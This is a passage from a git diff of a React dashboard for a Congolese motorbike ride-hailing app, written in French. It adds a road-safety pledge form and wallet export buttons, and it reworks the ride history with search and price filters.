-                    className="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-4 px-4 rounded-2xl transition-all flex items-center justify-center gap-2 cursor-pointer shadow-md select-none hover:scale-[1.01] duration-150"
-                  >
-                    <Navigation className="w-4 h-4 fill-white" />
-                    <div className="flex flex-col text-center">
-                      <span className="text-xs uppercase tracking-wider font-extrabold">Commander ma Course</span>
-                      <span className="text-[9px] opacity-75 font-normal font-mono">Recherche de chauffeur à {selectedCityName}</span>
+
+                  {!isPactSigned ? (
+                    <div className="flex flex-col space-y-3.5 w-full">
+                      {/* Mandatory Road Safety Pact Sign-up Card - Green/Dark Visual Style */}
+                      <div className="bg-gradient-to-br from-emerald-950 via-slate-950 to-slate-900 border-2 border-emerald-500/30 rounded-3xl p-5 text-white space-y-4 shadow-xl text-left">
+                        <div className="flex items-start gap-3">
+                          <div className="p-2.5 bg-emerald-500/15 text-emerald-400 rounded-xl border border-emerald-500/30 shrink-0">
+                            <Shield className="w-5 h-5" />
+                          </div>
+                          <div>
+                            <span className="text-[8.5px] font-mono font-black text-emerald-400 uppercase tracking-widest block">CONTRAT DE CITOYENNETÉ ROUTIÈRE</span>
+                            <h4 className="text-sm font-black text-white font-sans mt-0.5">Engagement Obligatoire au Pacte de Sécurité GoMoto RDC</h4>
+                            <p className="text-[10px] text-slate-400 mt-1 leading-normal">
+                              Chaque motard, passager et propriétaire de flotte est légalement tenu de souscrire formellement à l'application rigoureuse du Code de la Route Congolais (Loi n° 78/022) pour la préservation des vies humaines en RDC.
+                            </p>
+                          </div>
+                        </div>
+
+                        {/* Form starts here */}
+
+                        <form onSubmit={handleSignPact} className="space-y-4 text-left border-t border-slate-800/80 pt-3">
+                          {/* Name and Status */}
+                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                            <div className="space-y-1">
+                              <label htmlFor="pact-name-inp" className="block text-[8.5px] font-black text-slate-400 uppercase tracking-wider font-mono">
+                                VOTRE NOM & POSTNOM COMPLET :
+                              </label>
+                              <input
+                                id="pact-name-inp"
+                                type="text"
+                                required
+                                value={pledgeName}
+                                onChange={(e) => setPledgeName(e.target.value)}
+                                placeholder="Ex: Justin Kakonde Mbuyi"
+                                className="w-full bg-slate-900/95 border border-slate-800 rounded-xl px-3 py-2 text-[11px] text-white outline-none focus:border-emerald-500 placeholder-slate-600 font-semibold"
+                              />
+                            </div>
+
+                            <div className="space-y-1">
+                              <label htmlFor="pact-role-inp" className="block text-[8.5px] font-black text-slate-400 uppercase tracking-wider font-mono">
+                                VOTRE STATUT SUR L'APPLICATION :
+                              </label>
+                              <select
+                                id="pact-role-inp"
+                                value={pledgeRole}
+                                onChange={(e) => setPledgeRole(e.target.value as any)}
+                                className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-[11px] text-white outline-none focus:border-emerald-500 font-semibold cursor-pointer"
+                              >
+                                <option value="client">Passager (Client Voyageur)</option>
+                                <option value="driver">Chauffeur (Pilote Motard)</option>
+                                <option value="owner">Propriétaire de Flotte (Investisseur)</option>
+                              </select>
+                            </div>
+                          </div>
+
+                          {/* Interactive Checkboxes */}
+                          <div className="space-y-2.5 bg-slate-900/60 p-3.5 rounded-2xl border border-slate-850">
+                            <span className="text-[8.5px] font-black text-slate-500 uppercase tracking-widest block font-mono">
+                              COCHEZ CHAQUE ARTICLE OBLIGATOIRE POUR VALIDER :
+                            </span>
+
+                            <label className="flex items-start gap-2.5 cursor-pointer text-xs select-none group">
+                              <div className="mt-0.5 shrink-0">
+                                <input
+                                  type="checkbox"
+                                  checked={pledgeCasque}
+                                  onChange={(e) => setPledgeCasque(e.target.checked)}
+                                  className="h-3.5 w-3.5 accent-emerald-500 rounded border-slate-800 cursor-pointer"
+                                />
+                              </div>
+                              <span className="text-[10.5px] text-slate-300 leading-normal group-hover:text-white transition">
+                                <b>Art 1.</b> Je m’engage au port systématique du <b>casque de protection homologué</b> (double casque obligatoire pour le motard et son passager) à chaque seconde du trajet.
+                              </span>
+                            </label>
+
+                            <label className="flex items-start gap-2.5 cursor-pointer text-xs select-none group">
+                              <div className="mt-0.5 shrink-0">
+                                <input
+                                  type="checkbox"
+                                  checked={pledgeRules}
+                                  onChange={(e) => setPledgeRules(e.target.checked)}
+                                  className="h-3.5 w-3.5 accent-emerald-500 rounded border-slate-800 cursor-pointer"
+                                />
+                              </div>
+                              <span className="text-[10.5px] text-slate-300 leading-normal group-hover:text-white transition">
+                                <b>Art 2 & 3.</b> Je m'oppose fermement à toute forme de surcharge, au surpassement des 50 km/h et au franchissement de la commune interdite de la Gombe.
+                              </span>
+                            </label>
+
+                            <label className="flex items-start gap-2.5 cursor-pointer text-xs select-none group">
+                              <div className="mt-0.5 shrink-0">
+                                <input
+                                  type="checkbox"
+                                  checked={pledgeNoProhibited}
+                                  onChange={(e) => setPledgeNoProhibited(e.target.checked)}
+                                  className="h-3.5 w-3.5 accent-emerald-500 rounded border-slate-800 cursor-pointer"
+                                />
+                              </div>
+                              <span className="text-[10.5px] text-slate-300 leading-normal group-hover:text-white transition">
+                                <b>Art 7.</b> Je promets une vigilance civique totale (aucun transport de colis suspect ou fret prohibé) et accepte l'arbitrage légitime de GoMoto.
+                              </span>
+                            </label>
+
+                            <label className="flex items-start gap-2.5 cursor-pointer text-xs select-none group">
+                              <div className="mt-0.5 shrink-0">
+                                <input
+                                  type="checkbox"
+                                  checked={pledgeRespectDrivers}
+                                  onChange={(e) => setPledgeRespectDrivers(e.target.checked)}
+                                  className="h-3.5 w-3.5 accent-emerald-500 rounded border-slate-800 cursor-pointer"
+                                />
+                              </div>
+                              <span className="text-[10.5px] text-slate-300 leading-normal group-hover:text-white transition">
+                                <b>Art 8. Dignité & Respect.</b> Je m’engage à traiter mon chauffeur avec civilité, respect et déférence, et à proscrire rigoureusement tout comportement agressif ou haussement de ton.
+                              </span>
+                            </label>
+
+                            <label className="flex items-start gap-2.5 cursor-pointer text-xs select-none group">
+                              <div className="mt-0.5 shrink-0">
+                                <input
+                                  type="checkbox"
+                                  checked={pledgeRespectAgents}
+                                  onChange={(e) => setPledgeRespectAgents(e.target.checked)}
+                                  className="h-3.5 w-3.5 accent-emerald-500 rounded border-slate-800 cursor-pointer"
+                                />
+                              </div>
+                              <span className="text-[10.5px] text-slate-300 leading-normal group-hover:text-white transition">
+                                <b>Art 9. Collaboration.</b> Je m’engage à interagir avec tout agent du service clientèle de GoMoto RDC avec bienséance, politesse et intégrité.
+                              </span>
+                            </label>
+
+                            <label className="flex items-start gap-2.5 cursor-pointer text-xs select-none group">
+                              <div className="mt-0.5 shrink-0">
+                                <input
+                                  type="checkbox"
+                                  checked={pledgeZeroTolerance}
+                                  onChange={(e) => setPledgeZeroTolerance(e.target.checked)}
+                                  className="h-3.5 w-3.5 accent-emerald-500 rounded border-slate-800 cursor-pointer"
+                                />
+                              </div>
+                              <span className="text-[10.5px] text-slate-300 leading-normal group-hover:text-white transition">
+                                <b>Art 10. Vigilance Civique Sévère.</b> Je reconnais formellement que tout comportement ou conduite à risques, toute violence, ainsi que le transport ou trafic de stupéfiants ou d'armes à feu feront l'objet d'un signalement immédiat et d'une transmission de dossier aux autorités policières et judiciaires compétentes de la RDC.
+                              </span>
+                            </label>
+                          </div>
+
+                          <button
+                            type="submit"
+                            disabled={!pledgeName.trim() || !pledgeCasque || !pledgeRules || !pledgeNoProhibited || !pledgeRespectDrivers || !pledgeRespectAgents || !pledgeZeroTolerance}
+                            className="w-full bg-emerald-500 hover:bg-emerald-600 disabled:bg-slate-800 disabled:text-slate-600 disabled:cursor-not-allowed text-slate-950 text-xs font-black py-3 px-4 rounded-xl flex items-center justify-center gap-2 shadow-md hover:shadow-emerald-500/10 transition-all cursor-pointer uppercase font-mono tracking-wider"
+                          >
+                            <CheckCircle className="w-4 h-4 shrink-0" />
+                            <span>Signer & Enregistrer mon Engagement</span>
+                          </button>
+                        </form>
+                      </div>
+
+                      {/* Bottom Legal Context - Conformité d'état RDC as shown on photo */}
+                      <div className="bg-slate-900 border border-slate-800 text-white rounded-2xl p-4 space-y-3 text-left">
+                        <h4 className="text-[10px] font-black uppercase tracking-widest text-slate-400 flex items-center gap-1.5">
+                          <Scale className="w-3.5 h-3.5 text-amber-500" />
+                          <span>Conformité d'État RDC</span>
+                        </h4>
+                        <p className="text-[10px] text-slate-350 leading-relaxed">
+                          Chaque disposition contractuelle énoncée dans ce centre lèse ou profite directement aux utilisateurs de GoMoto selon les prescrits de <b>l'Autorité Urbaine de Sécurité du Transport Routier</b>. Tout incident, contestation tarifaire ou fraude de virement de portefeuille donne lieu à un arbitrage administratif officiel au sein de notre panel d'enquête de souveraineté.
+                        </p>
+                        <div className="pt-1 flex items-center gap-1.5">
+                          <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                          <span className="text-[8px] font-bold text-emerald-400 font-mono tracking-wide uppercase">SERVEUR JURIDIQUE SÉCURISÉ ACTIF</span>
+                        </div>
+                      </div>
                     </div>
-                  </button>
+                  ) : (
+                    <div className="flex flex-col space-y-3.5 w-full">
+                      {/* Certified Seal of safety commitment */}
+                      <div className="bg-gradient-to-r from-emerald-50/90 to-slate-50/90 border-2 border-emerald-500/20 rounded-2xl p-4 text-left flex flex-col sm:flex-row gap-3 items-start justify-between shadow-sm">
+                        <div className="flex gap-2.5 items-start text-[10.5px]">
+                          <span className="text-emerald-650 bg-emerald-100/80 p-2 rounded-xl shrink-0 text-base">🛡️</span>
+                          <div>
+                            <span className="font-extrabold text-emerald-900 block text-[11px] uppercase tracking-wide">PACTE DE SÉCURITÉ GOMOTO RDC SIGNÉ</span>
+                            <p className="text-slate-700 text-[10px] leading-relaxed mt-0.5">
+                              Vous avez signé l'<b>Engagement Obligatoire au Pacte de Sécurité</b> (port du casque homologué obligatoire et refus des surcharges).
+                            </p>
+                            <div className="mt-1 flex flex-wrap gap-1.5 items-center">
+                              <span className="bg-emerald-100 text-emerald-850 font-mono text-[9px] px-2 py-0.5 rounded font-black border border-emerald-200">
+                                ID CODE : {pledgeCertCode || `GOMOTO-RDC-SEC-PASS-${Math.floor(100000+Math.random()*900000)}`}
+                              </span>
+                              <span className="text-[9px] text-slate-450 font-mono">Signé le : {pledgeDateStr || new Date().toLocaleDateString("fr-CD")}</span>
+                            </div>
+                          </div>
+                        </div>
+                        <button
+                          type="button"
+                          onClick={() => {
+                            localStorage.removeItem(`gomoto_pact_signed_client_${profile.id}`);
+                            setIsPactSigned(false);
+                            setPledgeCasque(false);
+                            setPledgeRules(false);
+                            setPledgeNoProhibited(false);
+                            setPledgeRespectDrivers(false);
+                            setPledgeRespectAgents(false);
+                            setPledgeZeroTolerance(false);
+                          }}
+                          className="bg-rose-50 hover:bg-rose-100 border border-rose-200 text-[9.5px] font-medium text-rose-700 py-1 px-2.5 rounded-lg font-mono tracking-wider transition cursor-pointer self-end sm:self-start shrink-0"
+                        >
+                          RÉVOQUER
+                        </button>
+                      </div>
+
+                      {/* Port de Casque obligatoire block */}
+                      <div className="bg-blue-50 border border-blue-200/80 rounded-xl p-3.5 text-left">
+                        <div className="flex gap-2.5 items-start text-[10.5px]">
+                          <span className="text-sm shrink-0">🪖</span>
+                          <div className="space-y-0.5">
+                            <span className="font-extrabold text-blue-900 block uppercase tracking-wide">CASQUE OBLIGATOIRE ACTIF</span>
+                            <p className="text-blue-800 text-[10px] leading-relaxed">
+                              Conformément à votre Pacte signé, votre motard Héritier apportera votre casque de protection homologué. Le port est 100% requis pour démarrer la course.
+                            </p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <button
+                        type="button"
+                        onClick={() => {
+                          setIsSimulatingItinerary(true);
+                          setTimeout(() => {
+                            setIsSimulatingItinerary(false);
+                            handleRequestRide();
+                          }, 1000);
+                        }}
+                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-4 px-4 rounded-xl transition-all flex items-center justify-center gap-2 cursor-pointer shadow-md select-none hover:scale-[1.01] duration-150"
+                      >
+                        <Navigation className="w-4 h-4 fill-white animate-pulse" />
+                        <div className="flex flex-col text-center">
+                          <span className="text-xs uppercase tracking-wider font-extrabold">Commander ma Course</span>
+                          <span className="text-[9px] opacity-75 font-normal font-mono">
+                            Recherche immédiate à {selectedCityName}
+                          </span>
+                        </div>
+                      </button>
+                    </div>
+                  )}
                 </div>
               </div>
             ) : (
@@ -3386,61 +3997,32 @@ export default function ClientDashboard({
                 </div>
               </div>
 
-              {/* Interactive Simulation Form */}
-              <form onSubmit={handleInviteFriendSimulated} className="bg-white/80 p-3.5 rounded-xl border border-slate-150 space-y-3">
-                <span className="text-[9px] font-black text-amber-900 uppercase tracking-widest block">
-                  Simuler la Naissance d'un nouveau membre (Parrainage démo)
-                </span>
-                
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
-                  <div>
-                    <label className="block text-[8.5px] font-black text-slate-600 mb-1">Prénom de l'invité</label>
-                    <input
-                      type="text"
-                      placeholder="Ex: Junior"
-                      value={invitedName}
-                      onChange={(e) => setInvitedName(e.target.value)}
-                      className="w-full bg-slate-50 border border-slate-200 text-slate-805 rounded-lg px-2.5 py-1.5 text-xs outline-none focus:border-amber-500"
-                    />
-                  </div>
-                  <div>
-                    <label className="block text-[8.5px] font-black text-slate-600 mb-1">Téléphone de l'invité</label>
-                    <input
-                      type="text"
-                      placeholder="+243"
-                      value={invitedPhone}
-                      onChange={(e) => setInvitedPhone(e.target.value)}
-                      className="w-full bg-slate-50 border border-slate-200 text-slate-805 rounded-lg px-2.5 py-1.5 text-xs font-mono outline-none focus:border-amber-500"
-                    />
-                  </div>
-                </div>
-
-                <div className="flex justify-between items-center gap-4">
-                  <p className="text-[9px] text-slate-500 leading-snug max-w-[280px]">
-                    Saisissez les coordonnées de test. En soumettant, vous simulez instantanément son inscription via votre code parrainage !
-                  </p>
-                  <button
-                    type="submit"
-                    className="bg-amber-600 hover:bg-amber-700 text-white font-black text-[10px] px-4 py-2 rounded-xl transition-all shadow-md cursor-pointer flex items-center gap-1 border-b-2 border-amber-800"
-                  >
-                    <span>Faire s'inscrire & Créditer !</span>
-                  </button>
-                </div>
-
-                {referralFeedback && (
-                  <div className="bg-emerald-50 text-emerald-800 border border-emerald-200 p-2.5 rounded-lg text-[9.5px] font-medium leading-relaxed mt-2 animate-fade-in">
-                    {referralFeedback}
-                  </div>
-                )}
-              </form>
             </div>
 
             {/* Transactions Table module */}
             <div className="space-y-3">
-              <h4 className="text-[10px] font-bold text-slate-500 uppercase tracking-wider flex items-center gap-1.5">
-                <Clock className="w-4 h-4 text-blue-600" />
-                <span>Historique des Mouvements de Portefeuille</span>
-              </h4>
+              <div className="flex items-center justify-between">
+                <h4 className="text-[10px] font-bold text-slate-500 uppercase tracking-wider flex items-center gap-1.5">
+                  <Clock className="w-4 h-4 text-blue-600" />
+                  <span>Historique des Mouvements de Portefeuille</span>
+                </h4>
+                <div className="flex items-center gap-2">
+                  <button
+                    type="button"
+                    onClick={handleExportWalletCSV}
+                    className="flex items-center gap-1.5 px-3 py-1.5 bg-white border border-slate-200 rounded-lg text-[9px] font-bold text-slate-600 hover:text-slate-900 transition-all cursor-pointer shadow-sm hover:shadow"
+                  >
+                    <Download className="w-3 h-3" /> EXPORT CSV
+                  </button>
+                  <button
+                    type="button"
+                    onClick={handleExportWalletPDF}
+                    className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 border border-blue-200 rounded-lg text-[9px] font-bold text-blue-700 hover:text-blue-800 transition-all cursor-pointer shadow-sm hover:shadow"
+                  >
+                    <Download className="w-3 h-3" /> EXPORT PDF
+                  </button>
+                </div>
+              </div>
 
               <div className="bg-slate-50 rounded-2xl border border-slate-200 overflow-hidden">
                 <div className="divide-y divide-slate-100">
@@ -3520,255 +4102,314 @@ export default function ClientDashboard({
               )}
             </div>
 
-            {completedRides.length === 0 ? (
-              <div className="text-center py-12 px-4 border border-dashed border-slate-200 rounded-2xl">
-                <MapPin className="w-8 h-8 text-slate-300 mx-auto mb-3" />
-                <p className="text-xs text-slate-500 font-medium">Vous n'avez effectué aucune course pour le moment.</p>
-                <p className="text-[10px] text-slate-400 mt-1">Vos futurs trajets s'afficheront ici en temps réel après leur finalisation.</p>
-              </div>
-            ) : (
-              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start text-left">
+            {(() => {
+              const filteredRides = completedRides.filter(ride => {
+                const query = historySearchQuery.toLowerCase().trim();
+                let matchesQuery = true;
+                if (query) {
+                  const driverMatch = (ride.driverName || "").toLowerCase().includes(query);
+                  const idMatch = ride.id.toLowerCase().includes(query);
+                  const dateMatch = (ride.timestamp || "").toLowerCase().includes(query);
+                  const pickupMatch = `${ride.pickupAddress.avenue} ${ride.pickupAddress.commune} ${ride.pickupAddress.quartier}`.toLowerCase().includes(query);
+                  const dropoffMatch = `${ride.dropoffAddress.avenue} ${ride.dropoffAddress.commune} ${ride.dropoffAddress.quartier}`.toLowerCase().includes(query);
+                  matchesQuery = driverMatch || idMatch || dateMatch || pickupMatch || dropoffMatch;
+                }
                 
-                {/* List portion - Col span 5 */}
-                <div className="lg:col-span-12 xl:col-span-5 space-y-3 max-h-[500px] overflow-y-auto pr-1">
-                  {completedRides.map((ride) => {
-                    const isSelected = selectedHistoryRide === ride.id;
-                    return (
-                      <button
-                        key={ride.id}
-                        type="button"
-                        onClick={() => setSelectedHistoryRide(ride.id)}
-                        className={`w-full text-left p-4 rounded-2xl border transition-all cursor-pointer flex flex-col gap-2.5 ${
-                          isSelected
-                            ? "bg-slate-50 border-blue-500 ring-1 ring-blue-500"
-                            : "bg-white border-slate-200 hover:border-slate-300"
-                        }`}
-                      >
-                        <div className="flex justify-between items-start w-full">
-                          <span className="text-[9px] font-bold text-slate-400 font-mono uppercase tracking-wider bg-slate-100 px-2 py-0.5 rounded">
-                            {ride.id}
-                          </span>
-                          <span className="text-[9px] font-mono text-slate-500">
-                            {ride.timestamp}
-                          </span>
-                        </div>
+                let matchesPrice = true;
+                if (historyPriceRange === "under12k") {
+                  matchesPrice = ride.priceCDF < 12000;
+                } else if (historyPriceRange === "over12k") {
+                  matchesPrice = ride.priceCDF >= 12000;
+                }
+                
+                return matchesQuery && matchesPrice;
+              });
 
-                        <div className="space-y-1.5">
-                          <div className="flex gap-2 items-center text-xs font-semibold text-slate-850">
-                            <span className="h-2 w-2 rounded-full bg-emerald-500 flex-shrink-0" />
-                            <span className="truncate">{ride.pickupAddress.avenue}</span>
-                          </div>
-                          <div className="flex gap-2 items-center text-xs font-semibold text-slate-850">
-                            <span className="h-2 w-2 rounded-full bg-blue-600 flex-shrink-0" />
-                            <span className="truncate">{ride.dropoffAddress.avenue}</span>
-                          </div>
-                        </div>
+              if (completedRides.length === 0) {
+                return (
+                  <div className="text-center py-12 px-4 border border-dashed border-slate-200 rounded-2xl">
+                    <MapPin className="w-8 h-8 text-slate-300 mx-auto mb-3" />
+                    <p className="text-xs text-slate-500 font-medium">Vous n'avez effectué aucune course pour le moment.</p>
+                    <p className="text-[10px] text-slate-400 mt-1">Vos futurs trajets s'afficheront ici en temps réel après leur finalisation.</p>
+                  </div>
+                );
+              }
 
-                        <div className="flex justify-between items-center w-full pt-2 border-t border-slate-100 mt-1 text-[11px]">
-                          <span className="text-slate-500 font-medium">{ride.driverName || "Chauffeur GoMoto"}</span>
-                          <span className="font-mono font-extrabold text-blue-700">
-                            {ride.priceCDF.toLocaleString("fr-FR")} CDF
-                          </span>
-                        </div>
-                      </button>
-                    );
-                  })}
-                </div>
-
-                {/* Detail portion - Col span 7 */}
-                <div className="lg:col-span-12 xl:col-span-7">
-                  {(() => {
-                    const ride = completedRides.find(r => r.id === selectedHistoryRide) || completedRides[0];
-                    if (!ride) return null;
-
-                    return (
-                      <div className="bg-slate-50/60 rounded-2xl p-5 border border-slate-200 space-y-4">
-                        <div className="flex justify-between items-start border-b border-slate-200 pb-3">
-                          <div>
-                            <span className="text-[10px] font-mono text-slate-400 uppercase tracking-widest block">Rapport de course</span>
-                            <h4 className="text-xs font-black text-slate-800 uppercase mt-0.5 font-mono">{ride.id}</h4>
-                          </div>
-                          <div className="text-right">
-                            <span className="bg-emerald-100 text-emerald-800 border border-emerald-200 text-[9px] font-extrabold px-2 py-1 rounded">
-                              COURSE EFFECTUÉE
-                            </span>
-                          </div>
-                        </div>
-
-                        {/* Start & End locations lists */}
-                        <div className="space-y-3.5 bg-white p-4 rounded-xl border border-slate-150">
-                          <div className="flex gap-3 text-xs">
-                            <div className="flex flex-col items-center">
-                              <span className="h-3 w-3 rounded-full bg-emerald-500 flex items-center justify-center border-2 border-white ring-2 ring-emerald-100 flex-shrink-0" />
-                              <div className="w-0.5 h-8 bg-slate-200" />
-                              <span className="h-3 w-3 rounded-full bg-blue-600 flex items-center justify-center border-2 border-white ring-2 ring-blue-100 flex-shrink-0" />
-                            </div>
-                            <div className="space-y-4 flex-1">
-                              <div className="space-y-0.5">
-                                <span className="text-[8px] font-black text-slate-400 uppercase tracking-wider block">Départ</span>
-                                <span className="font-bold text-slate-800 text-[11px]">
-                                  {ride.pickupAddress.avenue}, Q.{ride.pickupAddress.quartier} ({ride.pickupAddress.commune})
-                                </span>
-                              </div>
-                              <div className="space-y-0.5">
-                                <span className="text-[8px] font-black text-slate-400 uppercase tracking-wider block">Destination</span>
-                                <span className="font-bold text-slate-800 text-[11px]">
-                                  {ride.dropoffAddress.avenue}, Q.{ride.dropoffAddress.quartier} ({ride.dropoffAddress.commune})
-                                </span>
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-
-                        {/* Static mapping system */}
-                        <div className="relative h-44 bg-slate-100 rounded-2xl border border-slate-200 overflow-hidden shadow-inner">
-                          {/* Grid road layout vector simulation lines */}
-                          <svg className="absolute inset-0 w-full h-full text-slate-200" xmlns="http://www.w3.org/2000/svg">
-                            <defs>
-                              <pattern id="grid-map-c" width="30" height="30" patternUnits="userSpaceOnUse">
-                                <path d="M 30 0 L 0 0 0 30" fill="none" stroke="currentColor" strokeWidth="0.5" />
-                              </pattern>
-                            </defs>
-                            <rect width="100%" height="100%" fill="url(#grid-map-c)" />
-                            
-                            {/* Kinshasa simulated road lines */}
-                            <line x1="0" y1="40" x2="100%" y2="40" stroke="#cbd5e1" strokeWidth="5" />
-                            <line x1="0" y1="120" x2="100%" y2="120" stroke="#cbd5e1" strokeWidth="5" />
-                            <line x1="80" y1="0" x2="80" y2="100%" stroke="#cbd5e1" strokeWidth="5" />
-                            <line x1="220" y1="0" x2="220" y2="100%" stroke="#cbd5e1" strokeWidth="5" />
-                            
-                            {/* Route trace curve line */}
-                            <path d="M 80 120 Q 150 80 220 40" fill="none" stroke="#3b82f6" strokeWidth="3" strokeDasharray="6,4" />
-                          </svg>
-
-                          {/* Floating Marker A (Start) */}
-                          <div className="absolute bottom-[28px] left-[66px] flex flex-col items-center">
-                            <span className="bg-emerald-600 text-white rounded-full p-1 text-[8.5px] font-black z-10 flex items-center justify-center shadow-lg w-5 h-5 leading-none">
-                              A
-                            </span>
-                            <span className="bg-slate-900/90 text-white font-bold text-[7.5px] px-1 py-0.5 rounded border border-slate-800 whitespace-nowrap mt-1 font-sans">
-                              {ride.pickupAddress.commune}
-                            </span>
-                          </div>
-
-                          {/* Floating Marker B (Destination) */}
-                          <div className="absolute top-[20px] left-[200px] flex flex-col items-center">
-                            <span className="bg-blue-650 text-white rounded-full p-1 text-[8.5px] font-black z-10 flex items-center justify-center shadow-lg w-5 h-5 leading-none">
-                              B
-                            </span>
-                            <span className="bg-slate-900/90 text-white font-bold text-[7.5px] px-1 py-0.5 rounded border border-slate-800 whitespace-nowrap mt-1 font-sans">
-                              {ride.dropoffAddress.commune}
-                            </span>
-                          </div>
-
-                          <div className="absolute top-2.5 right-2 text-right">
-                            <span className="bg-slate-900/70 backdrop-blur-xs text-white font-mono text-[8px] px-1.5 py-0.5 rounded-lg border border-slate-700 font-bold block">
-                              COMMUNE: {ride.pickupAddress.commune} vers {ride.dropoffAddress.commune}
-                            </span>
-                          </div>
-
-                          <div className="absolute bottom-2.5 right-2 text-right">
-                            <span className="bg-slate-900 text-yellow-400 font-mono text-[8.5px] font-extrabold px-2 py-0.5 rounded-lg border border-slate-800 shadow-md">
-                              Distance: {ride.distanceKm} km
-                            </span>
-                          </div>
-                        </div>
-
-                        {/* Invoice & Driver details bento row */}
-                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-left">
-                          <div className="bg-white p-4 rounded-xl border border-slate-150 flex flex-col justify-between">
-                            <div className="space-y-0.5 text-[10px]">
-                              <span className="text-[8px] font-black text-slate-400 uppercase tracking-widest block">Chauffeur Assigné</span>
-                              <p className="font-extrabold text-slate-850 mt-1">{ride.driverName || "Ir. Héritier LUKUSA"}</p>
-                              <p className="text-slate-500 mt-0.5 font-mono">{ride.driverPhone || "+243 899 123 456"}</p>
-                            </div>
-                            <div className="mt-3 bg-slate-50 p-2 rounded-lg text-[9px] text-slate-500 font-medium leading-relaxed">
-                              Le motard a été authentifié via reconnaissance faciale avant de démarrer ce trajet.
-                            </div>
-                          </div>
-
-                          <div className="bg-white p-4 rounded-xl border border-slate-150 text-xs flex flex-col justify-between">
-                            <span className="text-[8px] font-black text-slate-400 uppercase tracking-widest block mb-2">Facturation vérifiée</span>
-                            <div className="space-y-1.5">
-                              <div className="flex justify-between items-center text-slate-600 font-medium">
-                                <span>Prix de base :</span>
-                                <span className="font-mono">{ride.priceCDF.toLocaleString("fr-FR")} CDF</span>
-                              </div>
-                              <div className="flex justify-between items-center text-slate-600 font-medium">
-                                <span>Conversion USD :</span>
-                                <span className="font-mono">${ride.priceUSD.toFixed(2)} USD</span>
-                              </div>
-                              <div className="flex justify-between items-center font-extrabold text-slate-850 border-t border-slate-100 pt-1.5">
-                                <span>Total Payé :</span>
-                                <span className="font-mono text-emerald-700">{ride.priceCDF.toLocaleString("fr-FR")} CDF</span>
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-
-                        {/* Download Receipts & Revenues Row */}
-                        <div id={`history-ride-actions-row-${ride.id}`} className="bg-slate-50 border border-slate-200 p-4.5 rounded-2xl flex flex-col sm:flex-row gap-3.5 items-center justify-between text-left animate-fade-in shadow-sm">
-                          <div className="space-y-0.5 max-w-md">
-                            <span className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
-                              <span className="w-1.5 h-1.5 rounded-full bg-blue-600"></span>
-                              <span>Reçu de Ventilation des Revenus (Syndicat RDC)</span>
-                            </span>
-                            <span className="text-[10px] text-slate-500 block leading-relaxed font-sans">
-                              Télécharger le relevé de répartition GoMoto RDC avec répartition transparente : <b>70% Chauffeur</b> (Héritier), <b>15% Propriétaire de Flotte</b> (Dieudonné) et <b>15% GoMoto</b>.
-                            </span>
-                          </div>
-                          
+              return (
+                <div className="space-y-4">
+                  {/* Search and Filters Layout */}
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5 bg-slate-50 p-4 rounded-2xl border border-slate-150 text-left">
+                    <div className="space-y-1">
+                      <label className="text-[9.5px] font-bold text-slate-500 uppercase tracking-wider block">Chercher une course</label>
+                      <div className="relative">
+                        <input
+                          type="text"
+                          placeholder="Chauffeur, Commune, ID, Date..."
+                          value={historySearchQuery}
+                          onChange={(e) => setHistorySearchQuery(e.target.value)}
+                          className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs font-medium text-slate-800 outline-none focus:border-blue-500 placeholder-slate-400"
+                        />
+                        {historySearchQuery && (
                           <button
                             type="button"
-                            id={`btn-download-revenue-receipt-${ride.id}`}
-                            onClick={() => handleDownloadRevenueReceipt(ride)}
-                            className="w-full sm:w-auto bg-blue-600 hover:bg-blue-700 text-white font-extrabold text-[11.5px] px-4 py-2.5 rounded-xl transition-all flex items-center justify-center gap-2 cursor-pointer shadow-sm hover:translate-x-0.5 active:scale-95"
+                            onClick={() => setHistorySearchQuery("")}
+                            className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 font-bold text-xs"
                           >
-                            <Download className="w-3.5 h-3.5 text-white flex-shrink-0" />
-                            <span>Télécharger le PDF</span>
+                            ×
                           </button>
-                        </div>
+                        )}
+                      </div>
+                    </div>
 
-                        {/* Dispute Center Box */}
-                        <div className="bg-red-50/50 border border-red-100 rounded-2xl p-4.5 space-y-3 text-left">
-                          <div className="flex items-start gap-2.5">
-                            <span className="text-base select-none mt-0.5">⚠️</span>
-                            <div>
-                              <span className="font-extrabold text-red-950 text-xs block">Un problème avec ce trajet ?</span>
-                              <span className="text-[10px] text-red-805 block mt-1 leading-relaxed">
-                                Si cette course n'a pas été réellement effectuée ou si le motard GoMoto ne s'est jamais présenté, vous pouvez lancer immédiatement le protocole de conciliation d'État REPARO. L'arbitrage est instantané d'après la télémétrie GPS et déclenchera votre remboursement direct vers le portefeuille mobile (Wallet).
-                              </span>
+                    <div className="space-y-1 text-left">
+                      <label className="text-[9.5px] font-bold text-slate-500 uppercase tracking-wider block">Filtrer par Prix</label>
+                      <select
+                        value={historyPriceRange}
+                        onChange={(e) => setHistoryPriceRange(e.target.value)}
+                        className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs font-semibold text-slate-700 outline-none focus:border-blue-500 cursor-pointer"
+                      >
+                        <option value="all">Tous les Tarifs</option>
+                        <option value="under12k">Moins de 12 000 CDF</option>
+                        <option value="over12k">12 000 CDF ou plus</option>
+                      </select>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start text-left">
+                    {/* List portion - Col span 5 */}
+                    <div className="lg:col-span-12 xl:col-span-5 space-y-3 max-h-[500px] overflow-y-auto pr-1">
+                      {filteredRides.length === 0 ? (
+                        <div className="text-center py-10 bg-white border border-slate-150 rounded-2xl p-4">
